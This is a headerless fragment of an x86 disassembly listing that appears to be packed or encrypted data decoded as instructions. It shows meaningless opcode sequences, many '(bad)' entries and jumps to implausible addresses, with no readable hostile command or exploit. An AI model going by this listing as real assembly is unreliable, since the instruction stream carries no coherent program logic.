  4048b8:	lahf   
  4048b9:	lds    eax,FWORD PTR [eax]
  4048bb:	add    BYTE PTR ds:0x858d1414,dh
  4048c1:	xchg   edx,eax
  4048c2:	sub    eax,0x5e8c6f57
  4048c7:	enter  0xcbac,0x57
  4048cb:	mov    al,ds:0x3e9135e
  4048d0:	xor    DWORD PTR [ecx+0x543a0fac],ebx
  4048d6:	mov    ch,0x6
  4048d8:	mov    cl,0x4b
  4048da:	add    cl,ch
  4048dc:	daa    
  4048dd:	pop    ss
  4048de:	jmp    0x547c94
  4048e3:	es inc edi
  4048e5:	sbb    al,ch
  4048e7:	dec    eax
  4048e8:	(bad)  [ebx+0x1f2e2ff]
  4048ee:	jno    0xe9818184
  4048f4:	rol    DWORD PTR [ecx],1
  4048f6:	or     al,0x11
  4048f8:	adc    BYTE PTR [edi+edi*8-0xa],ch
  4048fc:	retf   0x6819
  4048ff:	sub    al,BYTE PTR [esi]
  404901:	aad    0xff
  404903:	in     eax,0x48
  404905:	sbb    al,ch
  404907:	push   cs
  404908:	lea    ecx,[ebx-0x33579f01]
  40490e:	dec    dh
  404910:	mov    dh,0xfc
  404912:	cmp    eax,0x8d1432e8
  404917:	fs repz mov bh,bh
  40491b:	mov    dh,0x5
  40491d:	jl     0x4048c6
  40491f:	lea    eax,[eax]
  404921:	add    BYTE PTR [esi+0x736c8d8b],dl
  404927:	mov    bh,bh
  404929:	sahf   
  40492a:	pop    ebp
  40492b:	mov    esi,DWORD PTR [ebp-0x7440af]
  404931:	adc    edx,0xbde900b9
  404937:	xchg   ecx,eax
  404938:	mov    esp,0x408ba67f
  40493d:	out    0xb6,al
  40493f:	cs add ecx,ebp
  404942:	xor    bl,BYTE PTR [ecx-0x7430d46b]
  404948:	call   DWORD PTR [esi+0x33]
  40494b:	and    al,0x0
  40494d:	jmp    0x6ac46484
  404952:	sub    eax,0xc5000014
  404957:	aad    0x2b
  404959:	push   eax
  40495a:	pusha  
  40495b:	call   0xbf888a8b
  404960:	mov    esp,0xb1748ad
  404965:	ror    ch,0x1b
  404968:	jmp    0x576239
  40496d:	lea    ebx,[ebp+0x27fffe56]
  404973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404974:	inc    edx
  404975:	sub    al,0xa8
  404977:	ds mov ebx,0xe816d92c
  40497d:	lahf   
  40497e:	jne    0x404990
  404980:	add    BYTE PTR [ebx],cl
  404982:	dec    eax
  404983:	sub    eax,0xe905
  404988:	(bad)  
  404989:	push   ss
  40498a:	add    BYTE PTR [eax],al
  40498c:	pop    es
  40498d:	sub    al,0xc
  40498f:	call   0x3ffa99
  404994:	rcl    DWORD PTR [esi+0x75],cl
  404997:	punpcklbw mm4,DWORD PTR [ebp+0x28]
  40499b:	inc    ecx
  40499c:	fsubr  DWORD PTR [ecx+0xcf00c75]
  4049a2:	(bad)  
  4049a4:	xchg   DWORD PTR [ebp-0x566795f6],edi
  4049aa:	jne    0x4049b8
  4049ac:	rcr    BYTE PTR [eax-0x5c380021],0x95
  4049b3:	ret    0xa9a6
  4049b6:	dec    DWORD PTR [ebp+0x5051842a]
  4049bc:	mov    al,ds:0x7ffdfc4
  4049c1:	inc    edi
  4049c2:	push   DWORD PTR [ebp+0x60]
  4049c5:	test   eax,0x2bd71475
  4049ca:	adc    BYTE PTR [eax+0x7],dl
  4049cd:	sub    al,0x8
  4049cf:	call   0xffdd3705
  4049d4:	push   esi
  4049d5:	aam    0xc5
  4049d7:	fisttp DWORD PTR [esi-0x2f]
  4049da:	test   eax,0xefbeb460
  4049df:	mov    BYTE PTR [eax+ecx*1-0x2c90063],dh
  4049e6:	pop    ds
  4049e7:	adc    BYTE PTR [ecx],dh
  4049e9:	test   al,0x1
  4049eb:	jmp    0x4049ed
  4049ed:	add    BYTE PTR [ebx+0x2a],al
  4049f0:	sbb    BYTE PTR [eax],dl
  4049f2:	push   ds
  4049f3:	jmp    0x1b57484e
  4049f8:	stos   DWORD PTR es:[edi],eax
  4049f9:	inc    edx
  4049fa:	fistp  QWORD PTR [ebx+0x3]
  4049fd:	or     esi,ecx
  4049ff:	(bad)  
  404a00:	fbld   TBYTE PTR [edi-0x14]
  404a03:	push   ebx
  404a04:	inc    esp
  404a05:	add    dh,dh
  404a07:	add    BYTE PTR [edi],cl
  404a09:	call   0xffdd9c33
  404a0e:	out    0xa0,al
  404a10:	pop    eax
  404a11:	(bad)  
  404a12:	fisub  WORD PTR [edx+0x34]
  404a15:	call   0xffde046f
  404a1a:	popa   
  404a1b:	(bad)  
  404a1c:	push   ds
  404a1d:	sbb    BYTE PTR [ecx],dh
  404a1f:	aas    
  404a20:	adc    bh,bh
  404a22:	inc    esp
  404a23:	addr16 xor edi,edi
  404a26:	cmp    al,0x73
  404a28:	pushf  
  404a29:	push   ebp
  404a2a:	dec    ecx
  404a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a2c:	adc    bh,bh
  404a2e:	sbb    al,0x7f
  404a30:	xor    edi,edi
  404a32:	and    al,0x73
  404a34:	stos   DWORD PTR es:[edi],eax
  404a35:	push   esp
  404a36:	xchg   esp,eax
  404a37:	call   0xff9d:0xb614e89d
  404a3e:	mov    ah,0xf0
  404a40:	sar    esi,0x7e
  404a43:	add    dh,BYTE PTR [edi+edi*8]
  404a46:	mov    esp,0x6eff9e37
  404a4b:	adc    al,0x51
  404a4d:	mov    ecx,0x86e91495
  404a52:	add    BYTE PTR [eax],al
  404a54:	jno    0x404a6f
  404a56:	ins    BYTE PTR es:[edi],dx
  404a57:	xchg   ebx,eax
  404a58:	push   edi
  404a59:	mov    DWORD PTR [esi-0x63],ecx
  404a5c:	test   al,cl
  404a5e:	inc    edi
  404a5f:	popf   
  404a60:	inc    esi
  404a61:	jl     0x404a92
  404a63:	jo     0x404a96
  404a65:	adc    al,0x36
  404a67:	push   edi
  404a68:	jns    0x4049f4
  404a6a:	cs popf 
  404a6c:	sbb    DWORD PTR [edi],edi
  404a6e:	inc    edx
  404a6f:	popf   
  404a70:	es pop ebx
  404a72:	sub    edi,eax
  404a74:	push   ds
  404a75:	loopne 0x404ad8
  404a77:	mov    al,0x8b
  404a79:	adc    al,0xe
  404a7b:	pop    ss
  404a7c:	and    eax,0x7f37c89
  404a81:	(bad)  
  404a82:	in     al,dx
  404a83:	pushf  
  404a84:	test   BYTE PTR [ecx+eax*1],bl
  404a87:	(bad)  
  404a89:	mov    dh,ch
  404a8b:	retf   0x23f3
  404a8e:	jmp    0xdeb804c9
  404a93:	push   ss
  404a94:	sub    eax,0xd6bd327c
  404a99:	mov    dl,ah
  404a9b:	ret    
  404a9c:	inc    ebp
  404a9d:	sub    al,dh
  404a9f:	push   ss
  404aa0:	and    esp,esp
  404aa2:	rcl    BYTE PTR [ecx+0x33b688df],1
  404aa8:	mov    dh,0xfe
  404aaa:	rcr    BYTE PTR [esp+0x1c9d3920],1
  404ab1:	sbb    al,0x91
  404ab3:	pop    ebp
  404ab4:	sahf   
  404ab5:	mov    BYTE PTR [esi-0x74ffff55],dl
  404abb:	ins    DWORD PTR es:[edi],dx
  404abc:	mov    ds,WORD PTR [eax+edi*2-0x23fc22ab]
  404ac3:	pushf  
  404ac4:	lea    ebx,[esp+eax*1+0x1f760020]
  404acb:	and    al,0xff
  404acd:	hlt    
  404ace:	ds (bad) 
  404ad0:	sbb    DWORD PTR [esi+0x3f],esp
  404ad3:	sbb    al,0xe8
  404ad5:	mov    al,ds:0x56ff88bd
  404ada:	aas    
  404adb:	and    bh,bh
  404add:	aam    0x42
  404adf:	mov    DWORD PTR [ebp-0xb],esi
  404ae2:	sbb    BYTE PTR ds:0x7c2ab4ff,dh
  404ae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ae9:	ss xchg ebp,eax
  404aeb:	mov    bh,bh
  404aed:	mov    ah,0x26
  404aef:	xchg   DWORD PTR [ebp-0x7],esi
  404af2:	lds    eax,FWORD PTR [ecx]
  404af4:	or     al,0x93
  404af6:	push   ds
  404af7:	xchg   DWORD PTR [ebp-0x1f],esi
  404afa:	retf   0xffa3
  404afd:	push   cs
  404afe:	lods   eax,DWORD PTR ds:[esi]
  404aff:	pop    ebp
  404b00:	ret    0x32d9
  404b03:	loope  0x404a8f
  404b05:	or     eax,0x9af050b1
  404b0a:	cmp    al,0xdf
  404b0c:	sub    dl,BYTE PTR [edx]
  404b0e:	mov    ecx,0xfde60bd1
  404b13:	xchg   esi,eax
  404b14:	inc    ebp
  404b15:	loope  0x404ad1
  404b17:	add    DWORD PTR [eax],ecx
  404b19:	data16 jo 0x404aa4
  404b1c:	(bad)  
  404b1d:	and    al,0x0
  404b1f:	add    BYTE PTR [ecx+0x32e90014],ah
  404b25:	xchg   ebx,eax
  404b26:	cmp    eax,0xffd4cdff
  404b2b:	call   0x2cc33356
  404b30:	cmp    eax,0xb83f7414
  404b35:	shr    edi,1
  404b37:	cmp    DWORD PTR [edi+0x15],ecx
  404b3a:	push   0xffffffe9
  404b3c:	inc    esp
  404b3d:	adc    al,0x83
  404b3f:	or     al,0x85
  404b41:	xchg   DWORD PTR [ebx+0x0],esi
  404b44:	xchg   ebp,eax
  404b45:	stos   BYTE PTR es:[edi],al
  404b46:	jne    0x404b58
  404b48:	mov    ds:0x32006a0e,eax
  404b4d:	adc    BYTE PTR [ebp-0xc01fbb],cl
  404b53:	adc    eax,0x40790e
  404b58:	arpl   WORD PTR [ebx+0x74],dx
  404b5b:	das    
  404b5c:	retf   
  404b5d:	sub    al,0xf4
  404b5f:	add    BYTE PTR [eax+edi*2-0x76],ah
  404b63:	inc    ebp
  404b64:	cmp    al,0x96
  404b66:	dec    ebp
  404b67:	lock xor ebx,DWORD PTR [eax]
  404b6a:	ja     0x404b83
  404b6c:	mov    ebx,DWORD PTR [edi-0x689b8a75]
  404b72:	jge    0x404b7c
  404b74:	mov    ds:0xae3efdd,eax
  404b79:	sahf   
  404b7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b7b:	mov    eax,ebp
  404b7d:	push   cs
  404b7e:	push   DWORD PTR [ebp+0x28]
  404b81:	fwait
  404b82:	add    bh,bh
  404b84:	add    BYTE PTR [eax],al
  404b86:	test   DWORD PTR [edi+0x106337e8],edx
  404b8c:	add    BYTE PTR [ebx+0x5b5e4b4b],cl
  404b92:	adc    DWORD PTR [esi+0xc],ecx
  404b95:	add    BYTE PTR ds:0x9483ec97,ah
  404b9b:	sahf   
  404b9c:	push   ebx
  404b9d:	push   esi
  404b9e:	pop    ss
  404b9f:	cmp    BYTE PTR [esi+0x2f],bl
  404ba2:	sbb    DWORD PTR [eax],edx
  404ba4:	call   0x52ef42
  404ba9:	mov    edx,DWORD PTR [eax-0x3703baaf]
  404baf:	adc    al,BYTE PTR [eax]
  404bb1:	add    BYTE PTR [ebx+0x403e7452],dl
  404bb7:	(bad)  
  404bb8:	cs inc ecx
  404bba:	mov    BYTE PTR ds:0xd23145e8,bh
  404bc0:	add    al,BYTE PTR [eax]
  404bc2:	cmp    bh,BYTE PTR [ebp+0xcba2f0f]
  404bc8:	sub    ebp,DWORD PTR [ebx+0x4e]
  404bcb:	cmp    al,0x4
  404bcd:	push   ebx
  404bce:	mov    eax,ecx
  404bd0:	outs   dx,BYTE PTR ds:[esi]
  404bd1:	add    BYTE PTR [ecx],dh
  404bd3:	jb     0x404b98
  404bd5:	je     0x404c1e
  404bd7:	add    bl,BYTE PTR [ebx+0x32e8f48d]
  404bdd:	call   0x43ddf6
  404be2:	loope  0x404bb9
  404be4:	mov    cl,0x83
  404be6:	(bad)  
  404be7:	rol    BYTE PTR [edx],1
  404be9:	je     0x404beb
  404beb:	add    BYTE PTR [ebx],ch
  404bed:	xchg   ebp,eax
  404bee:	add    al,0x0
  404bf0:	xor    DWORD PTR [ebp+0x3a],edi
  404bf3:	pop    esi
  404bf4:	mov    dh,BYTE PTR [esi+eax*8]
  404bf7:	mov    eax,0x37b31
  404bfc:	jle    0x404bc3
  404bfe:	ds leave 
  404c00:	repnz enter 0xec8e,0xb2
  404c05:	das    
  404c06:	xchg   ebx,eax
  404c07:	add    DWORD PTR [ebp+ecx*8-0x18],0x40
  404c0c:	xor    DWORD PTR [ebx+0xf],edi
  404c0f:	adc    dh,BYTE PTR [edx+0x702ec5c0]
  404c15:	jnp    0x404c1a
  404c17:	je     0x404c51
  404c19:	cli    
  404c1a:	(bad)  
  404c1b:	lds    ecx,FWORD PTR [edi]
  404c1d:	cmp    al,0x4
  404c1f:	add    BYTE PTR [esi+esi*2+0x5b],bl
  404c23:	add    DWORD PTR [ecx],esi
  404c25:	jnp    0x404c2a
  404c27:	leave  
  404c28:	repnz add BYTE PTR [edi],bh
  404c2b:	cli    
  404c2c:	idiv   DWORD PTR [ebx+0x3]
  404c2f:	(bad)  
  404c30:	jno    0x404cae
  404c32:	add    eax,esi
  404c34:	icebp  
  404c35:	js     0x404c3a
  404c37:	(bad)  
  404c38:	icebp  
  404c39:	adc    ebp,edx
  404c3b:	add    esi,DWORD PTR [edi-0x2c]
  404c3e:	in     al,0x3
  404c40:	outs   dx,DWORD PTR ds:[esi]
  404c41:	aam    0xeb
  404c43:	(bad)  
  404c44:	mov    ebp,0x1b3494cf
  404c49:	adc    al,0x13
  404c4b:	add    al,0xb
  404c4d:	adc    al,0x13
  404c4f:	add    al,0x0
  404c51:	add    BYTE PTR [ebx],cl
  404c53:	adc    al,0x3
  404c55:	add    al,0xd9
  404c57:	xor    ebp,ebx
  404c59:	add    esi,DWORD PTR [ecx]
  404c5b:	cli    
  404c5c:	or     BYTE PTR [esi],ch
  404c5e:	xor    edx,DWORD PTR [edi-0x7afe625c]
  404c64:	cld    
  404c65:	pop    ecx
  404c66:	pop    ds
  404c67:	shr    eax,cl
  404c69:	or     al,0x71
  404c6b:	(bad)  
  404c6c:	jmp    0x3193:0xa44d72ca
  404c73:	adc    al,0xe9
  404c75:	add    edi,DWORD PTR [esi+ecx*8-0xd9cbc8]
  404c7c:	sbb    al,0x2e
  404c7e:	xor    DWORD PTR [ebp-0x2cb83a0c],eax
  404c84:	call   0xe63f3d95
  404c89:	shr    BYTE PTR [esp+eax*4-0x17],0x3
  404c8e:	xor    DWORD PTR [esi+edi*8],edx
  404c91:	push   cs
  404c92:	std    
  404c93:	test   ah,bl
  404c95:	rcr    DWORD PTR [edi],0xd3
  404c98:	call   0xb0c4b929
  404c9d:	les    eax,FWORD PTR [ecx+ebx*4-0x64127b33]
  404ca4:	fs ds mov ecx,0x17f640e3
  404cab:	shr    eax,cl
  404cad:	stos   DWORD PTR es:[edi],eax
  404cae:	jo     0x404d1e
  404cb0:	mov    esi,0x196198
  404cb5:	test   eax,0xe3e0000
  404cba:	sub    DWORD PTR [esi*4-0x49ed88e1],0xffffffce
  404cc2:	out    dx,eax
  404cc3:	cmp    ebp,eax
  404cc5:	and    eax,0x8f32e9ab
  404cca:	rcl    BYTE PTR [ecx],0x4b
  404ccd:	adc    eax,0xe3982cb6
  404cd2:	push   cs
  404cd3:	aaa    
  404cd4:	aaa    
  404cd5:	xchg   BYTE PTR [eax-0x1a],dl
  404cd8:	add    bh,cl
  404cda:	cld    
  404cdb:	sbb    DWORD PTR [eax],edi
  404cdd:	mov    esi,0x15226545
  404ce2:	mov    dh,0xa4
  404ce4:	mov    ch,0xe3
  404ce6:	push   cs
  404ce7:	lahf   
  404ce8:	jp     0xcf212b3e
  404cee:	clc    
  404cef:	cdq    
  404cf0:	sub    DWORD PTR [esi+0x15024145],edi
  404cf6:	mov    bh,0xac
  404cf8:	shl    ah,0xe
  404cfb:	jbe    0x404d64
  404cfd:	mov    BYTE PTR [eax+0x26],dl
  404d00:	das    
  404d01:	test   BYTE PTR [eax-0xa],ch
  404d04:	or     ebp,edx
  404d06:	jmp    DWORD PTR [ebx+0x4f]
  404d09:	nop
  404d0a:	push   eax
  404d0b:	add    ecx,ebx
  404d0d:	scas   al,BYTE PTR es:[edi]
  404d0e:	add    cl,ch
  404d10:	mov    ch,0x58
  404d12:	xor    al,0x6c
  404d14:	aaa    
  404d15:	nop
  404d16:	push   eax
  404d17:	add    DWORD PTR [ecx-0x53],ebp
  404d1a:	add    cl,ch
  404d1c:	add    BYTE PTR [eax],al
  404d1e:	and    dl,BYTE PTR [ecx-0x13da8abb]
  404d24:	adc    DWORD PTR [esi],ecx
  404d26:	ins    BYTE PTR es:[edi],dx
  404d27:	adc    al,0xe8
  404d29:	cwde   
  404d2a:	xchg   ecx,eax
  404d2b:	cmp    edi,0xffffffc1
  404d2e:	inc    esi
  404d2f:	pop    esp
  404d30:	inc    DWORD PTR [eax]
  404d32:	not    DWORD PTR [ecx-0x3d]
  404d35:	push   ebp
  404d36:	inc    ebx
  404d37:	lods   al,BYTE PTR ds:[esi]
  404d38:	add    esp,0xffffab34
  404d3e:	dec    ebx
  404d3f:	xor    ebp,DWORD PTR [edx+0x0]
  404d42:	inc    edx
  404d43:	sbb    bh,bh
  404d45:	jne    0x404ce7
  404d47:	scas   eax,DWORD PTR es:[edi]
  404d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d49:	aad    0xa7
  404d4b:	stos   DWORD PTR es:[edi],eax
  404d4c:	mov    DWORD PTR [ebp-0x4c],eax
  404d4f:	xor    BYTE PTR [ecx],al
  404d51:	add    BYTE PTR [edi-0x7f8a0116],ah
  404d57:	scas   eax,DWORD PTR es:[edi]
  404d58:	out    0xd4,eax
  404d5a:	out    0xaa,eax
  404d5c:	push   0x17589c
  404d61:	(bad)  
  404d62:	int    0x37
  404d64:	(bad)  
  404d65:	push   edi
  404d67:	inc    edi
  404d68:	call   0xffeb4de8
  404d6d:	(bad)  
  404d6e:	int    0x37
  404d70:	(bad)  
  404d71:	push   edi
  404d73:	sti    
  404d74:	(bad)  
  404d75:	dec    DWORD PTR [eax-0x74]
  404d78:	test   DWORD PTR [eax+0x67],esp
  404d7b:	stos   DWORD PTR es:[edi],eax
  404d7c:	call   DWORD PTR [eax+0x70]
  404d7f:	leave  
  404d80:	test   eax,0x8000000
  404d85:	outs   dx,BYTE PTR ds:[esi]
  404d86:	enter  0x5a2b,0x8d
  404d8a:	mov    ebp,0xffab2774
  404d8f:	jmp    0x404d9c
  404d91:	xchg   edi,eax
  404d92:	aas    
  404d93:	add    BYTE PTR [ebp+0x14],bh
  404d96:	mov    edx,0x170801
  404d9b:	or     ecx,DWORD PTR [edx+0x24]
  404d9e:	add    eax,esi
  404da0:	iret   
  404da1:	push   ss
  404da2:	inc    edi
  404da3:	inc    ecx
  404da4:	dec    ecx
  404da5:	mov    al,ds:0x16c80080
  404daa:	jb     0x404d91
  404dac:	xor    DWORD PTR [esi-0x3d],esi
  404daf:	je     0x404dd0
  404db1:	aad    0x77
  404db3:	add    BYTE PTR [ecx],dh
  404db5:	ins    DWORD PTR es:[edi],dx
  404db6:	mov    BYTE PTR [ebp-0x693daf],al
  404dbc:	add    edx,ecx
  404dbe:	adc    BYTE PTR [eax],cl
  404dc0:	cdq    
  404dc1:	or     DWORD PTR [edi+0x7a59eff],ebp
  404dc7:	push   0x31
  404dc9:	daa    
  404dca:	add    al,0xff
  404dcc:	add    al,0x75
  404dce:	stos   DWORD PTR es:[edi],eax
  404dcf:	test   eax,0xe896915d
  404dd4:	ins    BYTE PTR es:[edi],dx
  404dd5:	xchg   edi,eax
  404dd6:	xchg   esi,eax
  404dd7:	jmp    ecx
  404dd9:	add    DWORD PTR [eax],edx
  404ddb:	or     BYTE PTR [ecx+0xf],bl
  404dde:	mov    al,0xff
  404de0:	data16 adc al,0x4
  404de3:	add    al,0x31
  404de5:	ins    DWORD PTR es:[edi],dx
  404de6:	stos   DWORD PTR es:[edi],eax
  404de7:	jmp    0xe1be4dec
  404dec:	xchg   ebp,eax
  404ded:	mov    DWORD PTR [eax+ecx*8+0x5446ff96],esi
  404df4:	xchg   esi,eax
  404df5:	add    esi,DWORD PTR [ecx]
  404df7:	ins    DWORD PTR es:[edi],dx
  404df8:	xchg   esi,eax
  404df9:	mov    ch,0xd5
  404dfb:	inc    ecx
  404dfc:	xchg   esi,eax
  404dfd:	call   FWORD PTR [ecx+0x26fff36d]
  404e03:	push   esp
  404e04:	add    eax,DWORD PTR [ecx+esi*1]
  404e07:	imul   ebp,DWORD PTR [ebx+0x36bc852],0x50
  404e0e:	push   cs
  404e0f:	loope  0x404e47
  404e11:	inc    DWORD PTR [esi]
  404e13:	adc    edx,DWORD PTR [esi+0x21232975]
  404e19:	aam    0xf6
  404e1b:	sub    BYTE PTR [edx],0xff
  404e1e:	xor    ch,BYTE PTR [ebx+0x3]
  404e21:	call   FWORD PTR [edi+ecx*4+0x14deff96]
  404e28:	push   ecx
  404e29:	add    eax,DWORD PTR [ecx+0x14]
  404e2c:	jmp    0xe9587f5c
  404e31:	add    ebx,ecx
  404e33:	sub    eax,DWORD PTR [eax-0x3a1bcefc]
  404e39:	dec    edi
  404e3a:	push   ebp
  404e3b:	cmp    DWORD PTR [esi-0x1ef8516b],0xae6868ab
  404e45:	xchg   ebp,eax
  404e46:	mov    DWORD PTR [edi-0x5c],edx
  404e49:	xchg   ebp,eax
  404e4a:	xchg   esi,eax
  404e4b:	in     al,0x9d
  404e4d:	sldt   WORD PTR [eax]
  404e50:	cmp    DWORD PTR [esp+ebx*4-0x4f],ebp
  404e54:	xchg   BYTE PTR [ecx-0x7e80cc7f],al
  404e5a:	xchg   BYTE PTR [edi-0x6a822354],al
  404e60:	outs   dx,BYTE PTR ds:[esi]
  404e61:	in     al,0x0
  404e63:	repnz pop ss
  404e65:	shr    eax,cl
  404e67:	stos   DWORD PTR es:[edi],eax
  404e68:	les    edi,FWORD PTR [eax+0x66]
  404e6b:	xchg   ebp,eax
  404e6c:	test   al,0x97
  404e6e:	mov    ch,0x94
  404e70:	dec    esi
  404e71:	sub    DWORD PTR [edx+0x57],0x954e80dd
  404e78:	xor    DWORD PTR [eax],ecx
  404e7a:	lods   al,BYTE PTR ds:[esi]
  404e7b:	xor    BYTE PTR [esp+ebx*8+0x3d],0x95
  404e80:	sub    BYTE PTR cs:[ebx-0x6e694c29],bh
  404e87:	xchg   esp,eax
  404e88:	push   ds
  404e89:	sub    ebp,0x1ddbdc94
  404e8f:	xchg   ebp,eax
  404e90:	push   cs
  404e91:	sbb    DWORD PTR [ebx+ecx*1-0x6ac539e7],0x3c5494fe
  404e9c:	test   BYTE PTR [eax-0x7ea70002],0x0
  404ea3:	div    BYTE PTR [edi]
  404ea5:	or     al,0xe8
  404ea7:	dec    eax
  404ea8:	mov    al,ds:0x67e6ff80
  404ead:	fdiv   st(6),st
  404eaf:	fisub  WORD PTR [ebp+0x3db580]
  404eb5:	add    BYTE PTR [eax+eax*4+0xc2fceff],bl
  404ebc:	call   0xffc0d04c
  404ec1:	shl    BYTE PTR [esi],cl
  404ec3:	out    dx,al
  404ec4:	inc    DWORD PTR [edx+0x2d]
  404ec7:	xor    DWORD PTR [ebp-0x1f],0xa6d3c6ca
  404ece:	mov    ebp,0xa435b580
  404ed3:	cmp    bh,0x81
  404ed6:	fldcw  WORD PTR [ecx-0x1]
  404ed9:	mov    fs,WORD PTR [ebp-0x6279a33a]
  404edf:	sub    al,0x89
  404ee2:	pushf  
  404ee3:	cmp    bh,0xc2
  404ee6:	test   eax,0xf3be5deb
  404eeb:	adc    ebp,eax
  404eed:	ror    edx,1
  404eef:	adc    eax,DWORD PTR [eax]
  404ef1:	jo     0x404ec2
  404ef3:	das    
  404ef4:	call   DWORD PTR [esi-0x63]
  404ef7:	xchg   esp,eax
  404ef8:	mov    ebp,0xff80a5fd
  404efd:	jmp    0xb3a87128
  404f02:	adc    eax,0x7735ffd5
  404f07:	xor    bh,bh
  404f09:	lds    ebp,FWORD PTR cs:[ebp+ecx*1+0x51]
  404f0e:	xor    dl,BYTE PTR [ebx+ecx*1]
  404f11:	sub    DWORD PTR [esi],edi
  404f13:	or     cl,BYTE PTR [ebp-0x811d84]
  404f19:	push   cs
  404f1a:	add    BYTE PTR [eax],al
  404f1c:	inc    eax
  404f1d:	jg     0x404eef
  404f1f:	add    bl,cl
  404f21:	or     al,0xdb
  404f23:	jne    0x404f01
  404f25:	xchg   esi,eax
  404f26:	test   DWORD PTR [eax],esi
  404f28:	fbld   TBYTE PTR [ebx+0x663050ff]
  404f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f2f:	add    al,cl
  404f31:	and    DWORD PTR [ecx*4-0x197ab],esp
  404f38:	fisttp WORD PTR [eax-0x1]
  404f3b:	jne    0x404f0d
  404f3d:	fwait
  404f3e:	inc    ebp
  404f3f:	shr    edi,cl
  404f41:	mov    ds:0xa3ec75ff,eax
  404f46:	jne    0x404f50
  404f48:	jo     0x404edb
  404f4a:	sar    edi,cl
  404f4c:	iret   
  404f4d:	inc    ebx
  404f4e:	pop    ebx
  404f4f:	leave  
  404f50:	retf   0xc
  404f53:	push   ebp
  404f54:	add    esi,DWORD PTR [ecx+eax*4-0x644f3c]
  404f5b:	(bad)  
  404f5c:	(bad)  
  404f5e:	sti    
  404f5f:	push   eax
  404f60:	scas   eax,DWORD PTR es:[edi]
  404f61:	sbb    eax,0x2fa5ff0c
  404f66:	sub    DWORD PTR [ecx+0x58],eax
  404f69:	fwait
  404f6a:	mov    edx,0xb1348a8
  404f6f:	rcr    BYTE PTR [edi-0x74],0xe7
  404f73:	add    BYTE PTR [eax+0x13],bl
  404f76:	mov    DWORD PTR [ebp-0x20],0x48000017
  404f7d:	dec    edx
  404f7e:	inc    ebp
  404f7f:	hlt    
  404f80:	add    BYTE PTR [eax],al
  404f82:	out    dx,eax
  404f83:	or     al,BYTE PTR [eax]
  404f85:	add    BYTE PTR [edx],al
  404f87:	adc    ebp,DWORD PTR [edx+0x0]
  404f8a:	lea    ecx,[ebp-0x5cb00814]
  404f90:	push   eax
  404f91:	push   0x8
  404f93:	xchg   esp,eax
  404f94:	inc    ebp
  404f95:	hlt    
  404f96:	enter  0x8593,0xf4
  404f9a:	xor    DWORD PTR [esi],ebx
  404f9c:	xchg   ebx,eax
  404f9d:	jmp    DWORD PTR [ecx+0xe]
  404fa0:	sbb    eax,edi
  404fa2:	idiv   bh
  404fa4:	mov    gs,eax
  404fa6:	enter  0x3e4,0x0
  404faa:	cmp    ch,BYTE PTR ds:0xd7c80518
  404fb0:	add    eax,DWORD PTR [eax]
  404fb2:	xor    edx,ebp
  404fb4:	dec    edi
  404fb5:	in     al,dx
  404fb6:	(bad)  
  404fb7:	pop    ebp
  404fb8:	xchg   edx,eax
  404fb9:	add    DWORD PTR ds:0xcdbd8677,edi
  404fbf:	gs xchg edx,eax
  404fc1:	jmp    FWORD PTR [esi]
  404fc3:	inc    ecx
  404fc4:	or     edi,edi
  404fc6:	hlt    
  404fc7:	push   esp
  404fc8:	sahf   
  404fc9:	mov    dh,0x19
  404fcb:	or     al,0xd4
  404fcd:	inc    eax
  404fce:	xor    eax,esp
  404fd0:	xchg   esp,esi
  404fd2:	sahf   
  404fd3:	mov    ch,0x92
  404fd5:	push   eax
  404fd6:	cdq    
  404fd7:	lock pop edx
  404fd9:	add    BYTE PTR [ecx],dh
  404fdb:	jb     0x404fa0
  404fdd:	je     0x404fdf
  404fdf:	loopne 0x404f68
  404fe1:	call   0x50d2e564
  404fe6:	add    BYTE PTR [eax],al
  404fe8:	mov    esp,0x66f796f7
  404fed:	add    eax,0x60e4ff33
  404ff2:	xchg   edx,eax
  404ff3:	xor    eax,0x4523f5
  404ff8:	pop    ecx
  404ff9:	in     al,0xaa
  404ffb:	inc    DWORD PTR [esi+0x71]
  404ffe:	ret    
  404fff:	je     0x404fe1
  405001:	repz xchg eax,esi
  405004:	ds aad 0x91
  405007:	push   0xbea26b30
  40500c:	es sar ebx,0xe7
  405010:	jae    0x40502b
  405012:	xchg   edx,eax
  405013:	push   DWORD PTR [edx+0x69f6414]
  405019:	jle    0x405039
  40501b:	add    al,0x7c
  40501d:	adc    BYTE PTR [ebx-0x1ef801fd],al
  405023:	fwait
  405024:	inc    esi
  405025:	bound  eax,QWORD PTR [esi]
  405027:	xchg   edx,eax
  405028:	fimul  DWORD PTR [edx]
  40502a:	xchg   ebx,eax
  40502b:	add    al,0xe6
  40502d:	pop    es
  40502e:	loope  0x404fcb
  405030:	adc    ah,BYTE PTR [edx-0x12]
  405033:	xchg   ecx,eax
  405034:	(bad)  
  405035:	(bad)  
  405036:	rcr    DWORD PTR [ecx+0x57de7dce],1
  40503c:	rol    DWORD PTR [ebp+0x7be91d6],0xe1
  405043:	fwait
  405044:	ins    BYTE PTR es:[edi],dx
  405045:	(bad)  
  405046:	(bad)  
  405047:	xchg   ecx,eax
  405048:	scas   al,BYTE PTR es:[edi]
  405049:	(bad)  
  40504a:	mov    ecx,0xa6000099
  40504f:	jge    0x405012
  405051:	or     eax,0x91ae7d84
  405056:	in     al,dx
  405057:	jnp    0x404fe9
  405059:	fmul   QWORD PTR [edi-0x36e6183]
  40505f:	jg     0x404fe2
  405061:	(bad)  
  405062:	(bad)  
  405063:	adc    al,0xe9
  405065:	mov    edx,0x36e90c73
  40506a:	mov    edx,0x4dc86870
  40506f:	test   DWORD PTR [esi-0x6f],esi
  405072:	lods   al,BYTE PTR ds:[esi]
  405073:	xlat   BYTE PTR ds:[ebx]
  405074:	ins    BYTE PTR es:[edi],dx
  405075:	xor    al,0x56
  405077:	pop    es
  405078:	cmc    
  405079:	nop
  40507a:	add    al,0xe0
  40507c:	cmovae esi,DWORD PTR [ecx]
  40507f:	ins    BYTE PTR es:[edi],dx
  405080:	test   DWORD PTR [ecx+0x31],ebp
  405083:	adc    al,0xe2
  405085:	ret    
  405086:	es xchg edi,eax
  405088:	call   0x2947:0x26143102
  40508f:	adc    al,0x0
